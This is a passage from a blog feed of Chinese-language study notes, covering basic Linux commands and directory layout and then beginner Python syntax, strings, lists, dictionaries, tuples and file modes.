class="line">NAME</span><br><span class="line">ssh - connects to a host using the SSH protocol.</span><br><span class="line"></span><br><span class="line">SYNOPSYS # Windows下示例语法</span><br><span class="line">ssh [user@]host[ port][;host[ port]]</span><br><span class="line"></span><br><span class="line">OPTIONS</span><br><span class="line">user   Indicates the user&#x27;s login name.</span><br><span class="line">host   Indicates the name, alias, or Internet address of the</span><br><span class="line">       remote host.</span><br><span class="line">port   Indicates a port number (address of an application).</span><br><span class="line">       If the port is not specified, the default ssh port #端口号一般可省略，默认连接22端口</span><br><span class="line">       (22) is used.</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p><strong>Linux与Windows区别</strong></p><ul><li>windows目录分隔符为反斜杠\，而Linux为正斜杠/</li><li>Windows文件不区分大小写，Linux严格区分</li><li>Windows文件后缀名代表了文件属性，Linux文件属性依靠权限位决定</li><li>Linux一切皆文件，所有操作皆可以以文件形式找到，只有一个根</li></ul><blockquote><p>即使Linux中后缀名没有作用，但良好的命名能让我们更方便了解文件的类型<br>压缩文件：.gz 、bz2 、zip.、tar.gz等，软件包：.rpm，脚本文件：.sh、.py、.java 网页相关：.html、.js、.css</p></blockquote><table><thead><tr><th style="text-align:center">常见重要目录</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>/opt</code></td><td style="text-align:center">一般存放第三方大型软件</td></tr><tr><td style="text-align:center"><code>/home</code></td><td style="text-align:center">普通用户家目录</td></tr><tr><td style="text-align:center"><code>/root</code></td><td style="text-align:center">超级用户家目录</td></tr><tr><td style="text-align:center"><code>/etc</code></td><td style="text-align:center">存放各种配置文件的目录</td></tr><tr><td style="text-align:center"><code>/var/log/</code></td><td style="text-align:center">存放系统默认各种日志的目录</td></tr></tbody></table><p>Linux每个指令都相当于一个可执行文件，能直接识别是因为添加到了PATH路径中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# echo $&#123;PATH&#125;</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line"># 仅在终端中定义一环境变量，生命周期截至此终端关闭</span><br></pre></td></tr></table></figure><hr><h3 id="linux命令语法">Linux命令语法</h3><blockquote><p>命令在终端输入，可按<code>ctrl+alt+F1~F7</code>切换终端</p></blockquote><p><code>命令</code>+<code>空格</code>（可省略）+<code>参数</code>+<code>空格</code>+<code>文件/文件夹</code>（可省略）<br>命令提示符<code>[oracle@localhost ~]$ </code><br>包含登录信息、占位符、主机名和工作目录等信息<br><code>~</code> 是特殊目录之一，root用户为/root,普通用户为家目录<br><code>-</code>  返回上一次目录 <code>./</code> 当前目录  <code>../</code>  上一级目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[oracle@localhost ~]$ whoami</span><br><span class="line">oracle</span><br><span class="line">[oracle@localhost ~]$ hostname</span><br><span class="line">localhost.localdomain</span><br><span class="line">[oracle@localhost ~]$ pwd</span><br><span class="line">/home/oracle</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>ls</code></td><td style="text-align:center">展示该文件夹下</td></tr><tr><td style="text-align:center"><code>cd</code></td><td style="text-align:center">转到某一目录</td></tr><tr><td style="text-align:center"><code>clear</code></td><td style="text-align:center">清屏</td></tr><tr><td style="text-align:center"><code>mkdir</code></td><td style="text-align:center">创建文件夹</td></tr><tr><td style="text-align:center"><code>touch</code></td><td style="text-align:center">创建文件或更改文件时间戳</td></tr><tr><td style="text-align:center"><code>cat</code></td><td style="text-align:center">打开文件</td></tr><tr><td style="text-align:center"><code>echo</code></td><td style="text-align:center">展示一句话到终端/文档</td></tr><tr><td style="text-align:center"><code>rmdir</code></td><td style="text-align:center">删除文件夹</td></tr><tr><td style="text-align:center"><code>su</code></td><td style="text-align:center">切换登录用户（使用-，可加载用户的环境变量）</td></tr></tbody></table><blockquote><p>用户的配置文件存放在~/.bash_profile中，在Linux中以 . 开头的文件为隐藏文件，用ls -a 即可显示</p></blockquote><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>uname</code></td><td style="text-align:center">查看系统内核信息</td></tr><tr><td style="text-align:center"><code>man</code></td><td style="text-align:center">linux提供的帮助文档，按q退出</td></tr><tr><td style="text-align:center"><code>shutdown</code></td><td style="text-align:center">关机</td></tr><tr><td style="text-align:center"><code>history</code></td><td style="text-align:center">显示历史记录（默认 3000条）</td></tr><tr><td style="text-align:center"><code>id</code></td><td style="text-align:center">验证该用户是否存在</td></tr><tr><td style="text-align:center"><code>bash</code></td><td style="text-align:center">再次加载用户的环境变量，更新用户的主机信息</td></tr><tr><td style="text-align:center"><code>stat</code></td><td style="text-align:center">显示文件或文件系统的状态</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><p>其他命令：</p><ul><li>useradd添加系统用户 passwd更改用户密码</li><li>hostnamectl set-hostname  更改主机名</li><li>which 在PATH中找到命令的绝对路径并输出</li></ul><p><a href="http://linux.51yip.com/">Linux命令中文手册</a></p><p>其他零碎知识点：<br>命令 + <code>--help</code>参数可以查看该命令的所有参数及功能<br>多个参数可组合简写<br><code>&gt;</code>是覆盖写入，<code>&gt;&gt;</code>是追加写入<br>echo搭配双引号使用会解析特殊符号，搭配单引号为单纯字符串<br><code>CTRL+C</code>强制中断Linux操作</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python（基础篇）笔记</title>
      <link href="/2023/07/22/python/"/>
      <url>/2023/07/22/python/</url>
      
        <content type="html"><![CDATA[<h1>python基础知识</h1><h2 id="引言">引言</h2><p>作为我第一门系统学习的解释性脚本语言，先理解解释型语言和编译型语言的区别<br><strong>编译型源代码–&gt;编译器–&gt;可执行文件</strong>   （一次编译，多次运行，效率高，移植性差）<br><strong>解释型源代码–&gt;解释器</strong><br>故首先需按安装python解释器，本文以<code>3.10.11</code>为准<br>在没有IDE的情况下，我们有两种方法执行python代码:</p><ol><li><p>交互式命令行</p></li><li><p>运行文本文件<br><img src="https://img1.imgtp.com/2023/07/21/jsHferfQ.png" alt="交互式命令行"><br><img src="https://img1.imgtp.com/2023/07/21/4Vy3MQ4z.png" alt="运行文本文件"><br>首先我们需要用dos命令找到安装的python解释器（若将其添加到全局PATH中，可省略）<br><code>dir</code>   显示当前路径下的文件夹<br><code>cd</code>   转到对应路径（仅限同一盘符)cd …/ 回退一级<br><code>D:</code>   转移到对应盘符<br><code>tab</code>  补全输入内容</p></li></ol><p>为了便捷，接下来都将以**Pycharm(22.10.3 professional)**作为集成开发环境辅助学习</p><hr><h2 id="基本语法">基本语法</h2><p>首先补充基本的输入输出函数<br><code>ctrl</code>+<code>左键点击</code>可查看内置函数的源码<br><strong>input</strong> &amp;&amp; <strong>print</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = input(&quot;请输入姓名:&gt;&quot;)</span><br><span class="line">age = input(&quot;请输入年龄:&gt;&quot;)</span><br><span class="line">print(f&quot;姓名：&#123;name&#125; 年龄：&#123;age&#125;&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>input默认接收的均为字符串，可用类型转换函数type(s)转换</p></blockquote><h3 id="语法结构">语法结构</h3><h4 id="1-语句分隔符">1.语句分隔符</h4><p>python中通常以<code>换行符</code>作为语句分隔符<br>若想在同一行中执行多句语句，也可用<code>;</code>作为分隔（不推荐，不符合pep8规范）</p><blockquote><p>python代码应符合pep8规范，在pycharm中，绿色波浪线代表违反规范，按Ctrl+Alt+L可一键调整</p></blockquote><p>一行写一条语句，大大提高代码的可读性和规范性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">1</span>+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;welcome&quot;</span>); <span class="built_in">print</span>(<span class="string">&quot;BYF&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>注意</code>：python代码缩进要求严格，允许空行，不可缩进</p><h4 id="2-注释">2.注释</h4><p>python中用<code>#</code>单行注释<br>三引号（单引号或双引号均可）多行注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random  <span class="comment"># 导入获取随机数的random模块</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">round</span>(random.random()*<span class="number">100</span>)) <span class="comment"># 生成一到100的随机整数</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="变量">变量</h3><p>特性:</p><ol><li>多次使用（不会被垃圾回收机制回收）</li><li>值可修改 （和编译型语言不同，修改时指向变化，原值被回收）</li></ol><blockquote><p>变量名应符合规范</p></blockquote><h3 id="基本数据类型">基本数据类型</h3><p>基本数据类型：</p><ol><li>整型与浮点型</li><li>bool类型（True、False）</li><li>字符串</li></ol><blockquote><p>python内置函数type()返回数据类型名</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="number">10</span>))  <span class="comment">#&lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="number">2.5</span>))  <span class="comment">#&lt;class &#x27;float&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="number">10</span> &gt; <span class="number">5</span>))  <span class="comment">#&lt;class &#x27;bool&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="string">&quot;hello world&quot;</span>))  <span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>内置函数bool，可求变量或表达式的bool值<br>零值：所有数据类型中有且仅有一个值的bool类型为False 字符串 &quot;&quot;列表 [] 字典 {}</p></blockquote><p>字符串作用：</p><ol><li>展示文本</li><li>储存数据</li><li>传递字节</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&quot;hello a1&quot;</span>  <span class="comment"># 方式1</span></span><br><span class="line">s1 = <span class="string">&#x27;hello a2&#x27;</span>  <span class="comment"># 方式2</span></span><br><span class="line">s3 = <span class="string">&quot;&quot;&quot;         </span></span><br><span class="line"><span class="string">        1. 购买道具</span></span><br><span class="line"><span class="string">        2. 攻击</span></span><br><span class="line"><span class="string">        3. 逃跑</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>              <span class="comment"># 方式3</span></span><br></pre></td></tr></table></figure><h4 id="字符串基本操作">字符串基本操作</h4><p><strong>转义符</strong>  <code>\</code></p><ol><li>给予普通符号特殊功能</li><li>将具有特殊功能的符号普通化</li></ol><table><thead><tr><th style="text-align:center">符号</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>\&quot;</code></td><td style="text-align:center">双引号</td></tr><tr><td style="text-align:center"><code>\\</code></td><td style="text-align:center">反斜杠</td></tr><tr><td style="text-align:center"><code>\n</code></td><td style="text-align:center">换行符</td></tr><tr><td style="text-align:center"><code>\t</code></td><td style="text-align:center">制表符</td></tr><tr><td style="text-align:center"><code>\r</code></td><td style="text-align:center">回车符</td></tr><tr><td style="text-align:center"><code>\'</code></td><td style="text-align:center">单引号</td></tr></tbody></table><p><strong>格式化输出</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;byf&quot;</span></span><br><span class="line">username = <span class="string">&quot;Oracle&quot;</span></span><br><span class="line">passwd = <span class="number">123456</span></span><br><span class="line"><span class="comment"># 方式1（不推荐）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello %s!,your username is %s,your passwd is %d&quot;</span> % (name, username, passwd))</span><br><span class="line"><span class="comment"># 方式2（3.6版本后可用）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hello <span class="subst">&#123;name&#125;</span>!,your username is <span class="subst">&#123;username&#125;</span>,your passwd is <span class="subst">&#123;passwd&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="字符串序列操作">字符串序列操作</h4><blockquote><p>python支持负索引，从右（-1）到左依次减一<br>字符串是不可变的，不能像列表一样修改其中某个数据</p></blockquote><p><strong>索引操作</strong>  查询字符   ： 字符串[索引]<br><code>print(s[0])</code></p><hr><p><strong>切片操作</strong> 获取字符串  ： 字符串[开始索引:结束索引:步长(默认为1)]（顾头不顾尾）<br><code>print(s[0:5])</code>缺省默认从头尾取<br>步长为2时，隔一个取一个字符，以此类推<br>步长为负时，从右向左取<br><strong>一个有趣的应用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串倒序</span></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><hr><p><strong>拼接操作</strong>  字符串1+字符串2  ||  字符串*int</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s1 = &quot;hello &quot;</span><br><span class="line">s2 = &quot;Oracle&quot;</span><br><span class="line">print(s1+s2)</span><br></pre></td></tr></table></figure><hr><p><strong>计算字符串长度</strong>   内置函数len<br><code>print(len(s1))</code></p><blockquote><p>中文算作一个字符</p></blockquote><hr><p><strong>in判断</strong>  判断某个成员是否存在（返回bool类型）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&quot;hello Oracle&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span> <span class="keyword">in</span> s1)  <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h4 id="字符串内置方法">字符串内置方法</h4><table><thead><tr><th style="text-align:center">内置函数</th><th style="text-align:center">功能</th><th style="text-align:left">实例</th></tr></thead><tbody><tr><td style="text-align:center">upper</td><td style="text-align:center">将字符串中所有字符转化为大写</td><td style="text-align:left">s1.upper()</td></tr><tr><td style="text-align:center">lower</td><td style="text-align:center">~转化为小写</td><td style="text-align:left">s1.lower()</td></tr><tr><td style="text-align:center">startswith</td><td style="text-align:center">判断字符串是否以…开头(返回bool)</td><td style="text-align:left">s1.startswith(“hello”)</td></tr><tr><td style="text-align:center">endswith</td><td style="text-align:center">判断是否以…结尾</td><td style="text-align:left">s2.endswith(&quot;.jpg&quot;)</td></tr><tr><td style="text-align:center">isdigit</td><td style="text-align:center">判断是否为纯数字字符串</td><td style="text-align:left">s2.isdigit()</td></tr><tr><td style="text-align:center">strip</td><td style="text-align:center">去除字符串两端的空格或换行符</td><td style="text-align:left">s2.strip()</td></tr><tr><td style="text-align:center">join</td><td style="text-align:center">把列表中的字符串按一分隔符拼接</td><td style="text-align:left">“,”.join(list)</td></tr><tr><td style="text-align:center">split</td><td style="text-align:center">把字符串按一分隔符分割，存到列表中</td><td style="text-align:left">cities.split(&quot;,&quot;)</td></tr></tbody></table><p><strong>其他方法</strong>：</p><ol><li>find    搜索指定字符串，返回索引，没有返回-1</li><li>index   功能同上，但找不到时报错</li><li>count  计算字符串中子串出现的顺序</li><li>replace  将字符串中字串替换为指定字符串</li><li>center  将字符串左右添加填充符到指定长度</li><li>encode  将字符串按指定方式编码</li></ol><blockquote><p>replace 缺省默认全部替换，传入int型可指定替换个数</p></blockquote><h3 id="运算符">运算符</h3><p>计算运算符：<code>+</code>、<code>-</code>、<code>*</code>、<code>/</code>、<code>%</code><br>比较运算符：<code>&gt;</code>、<code>&lt;</code>、<code>&gt;=</code>、<code>&lt;=</code>、<code>==</code>、<code>!=</code></p><blockquote><p>返回类型为bool</p></blockquote><p>赋值运算符：<code>=</code>、<code>+=</code>、<code>-=</code>、<code>/=</code>、<code>*=</code>、<code>%=</code><br>逻辑运算符：<code>and</code>、<code>or</code>、<code>not</code></p><blockquote><p>python范围判断可以直接写成 18&lt;age&lt;35</p></blockquote><p>成员运算符：<code>in</code></p><h3 id="流程控制语句">流程控制语句</h3><p><strong>多分支语句</strong></p><blockquote><p>注意四个空格的缩进和英文冒号</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入你的年龄:&gt;&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎访问&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;禁止访问&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>多分支</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">weight = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入你的体重(公斤):&gt;&quot;</span>))</span><br><span class="line">height = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入你的身高(米):&gt;&quot;</span>))</span><br><span class="line">BMI = weight / height ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> BMI &lt; <span class="number">18.5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;偏瘦&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> BMI &lt; <span class="number">24</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正常&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> BMI&lt; <span class="number">28</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;超重&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;肥胖&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>循环语句</strong></p><p>while循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> count &lt;= <span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;count =&quot;</span>, count)</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>for循环<br>对一个序列（如字符串、列表、元组）进行遍历操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lis = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i&quot;</span>, i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">100</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i&quot;</span>, i)</span><br></pre></td></tr></table></figure><p><code>break</code>  退出整个循环<br><code>continue</code>  退出当前循环</p><hr><h3 id="高阶数据类型">高阶数据类型</h3><h4 id="列表">列表</h4><p><code>[]</code>内以逗号分隔，按照索引存放各种数据类型<br>可修改指定索引位置对应的值</p><p><strong>列表的操作</strong><br>追加：数据被追加到尾部</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">letter.append(<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(letter)</span><br></pre></td></tr></table></figure><p>插入：可插入列表中任一位置(也可用此方法嵌套列表)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">letter.insert(<span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(letter)</span><br><span class="line"></span><br><span class="line">letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">letter.insert(<span class="number">2</span>, [<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(letter[<span class="number">2</span>][<span class="number">1</span>])  <span class="comment"># y</span></span><br></pre></td></tr></table></figure><p>合并：把另一列表的值合并进来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">letter1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">letter2 = [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">letter1.extend(letter2)</span><br><span class="line"><span class="built_in">print</span>(letter1)</span><br></pre></td></tr></table></figure><p>del删除：直接删除指定位置元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> letter[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(letter)  <span class="comment">#[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;d&#x27;, &#x27;e&#x27;]</span></span><br></pre></td></tr></table></figure><p>pop弹出：弹出列表最后一个元素并返回（也可指定位置）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">a = letter.pop()</span><br><span class="line"><span class="built_in">print</span>(letter)</span><br></pre></td></tr></table></figure><p>remove删除：指定元素名删除，如有多个删除从左到右第一个</p><p>clear清空：清除列表中所有元素</p><p>index查找：返回从左到右第一个指定元素的索引<br><strong>切片操作和字符串类似</strong></p><p>sort排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>]</span><br><span class="line">a = letter.sort()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>reverse反转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>]</span><br><span class="line">a = letter.reverse()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><h4 id="字典">字典</h4><p>为满足快速查询，引入key-value的字典类型，以花括号包裹<br>key必须为不可变的数据类型（如数字、字符串）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>: <span class="string">&quot;hello&quot;</span>,</span><br><span class="line">    <span class="string">&quot;y&quot;</span>: <span class="string">&quot;world&quot;</span>,</span><br><span class="line">    <span class="string">&quot;z&quot;</span>: <span class="string">&quot;!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(dic[<span class="string">&quot;x&quot;</span>], dic[<span class="string">&quot;y&quot;</span>], dic[<span class="string">&quot;z&quot;</span>])</span><br><span class="line"><span class="comment"># dic.get(&quot;&quot;) 方法也可取用，优点是找不到不报错，返回None</span></span><br></pre></td></tr></table></figure><blockquote><p>字典也可以进行嵌套</p></blockquote><p><strong>增删改查操作</strong></p><ul><li>增加：<code>dic[&quot;a&quot;] = &quot;error&quot;</code> 直接对新key值赋值即可添加</li><li>删除：<code>del dic[&quot;x&quot;]</code>、<code>dic.pop(&quot;y&quot;)</code>、<code>dic.clear()</code>前两个为清除指定key,后一个为清空</li><li>修改：操作同增加，若key值存在，即会修改value值</li><li>查找 <code>dic.keys()</code>返回一个包含字典所有KEY的列表；<code>dic.values()</code>返回一个包含字典所以value的列表；<code>dic.items()</code>返回一个包含所有（键、值）元组的列表</li></ul><p><strong>循环</strong></p><ol><li><code>for k in dic.keys()</code></li><li><code>for k,v in dic.items()</code></li><li><code>for k in dic</code>(推荐，效率更快)</li></ol><h4 id="元组">元组</h4><p>元组(tuple)是Python中另一种内置的存储有序数据的结构。<br>元组与列表类似，也是由一系列按特定顺序排列的元素组成，可存储不同类型的数据，<br>如字符串、数字甚至元组。然而，元组是不可改变的，创建后不能再做任何修改操作。<br>元组可作为字典的键值，而列表不行<br>元组由（）包裹</p><p><strong>删除元组</strong><br>元组中的元素值是不允许更改的，但可以使用del语句整个删除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>)</span><br><span class="line">tupleName = <span class="built_in">tuple</span>(data)</span><br><span class="line"><span class="keyword">del</span> tupleName</span><br><span class="line"><span class="built_in">print</span>(tupleName)</span><br></pre></td></tr></table></figure><p><strong>元组常见操作</strong></p><p>元组是不可变序列，虽然不能对单个元素值进行修改，但可以重新赋值以达到更改效果<br><code>len(tup)</code><br><code>max(tup)</code><br><code>min(tup)</code><br>元组和列表的相互转换<br><code>tuple()</code>函数接收一个列表，返回一个元组<br><code>list()</code>函数接收一个元组，返回一个列表</p><h3 id="文件操作">文件操作</h3><blockquote><p>python3在内存中默认用Unicode编码，但存在文件里或网络发送，用utf-8编码</p></blockquote><p>字节类型就是二进制格式，通常用十六进制来表示，编码后转成bytes字节类型，可防止显示乱码</p><p>操作文件流程：</p><ol><li>打开文件</li><li>读 || 修改</li><li>保存 &amp;&amp; 关闭</li></ol><p><strong>打开文件（文本模式）</strong></p><ul><li>r 只读模式</li><li>w 创建模式，若文件已经存在，则覆盖旧文件</li><li>a 追加模式，新数据会写到文件末尾</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 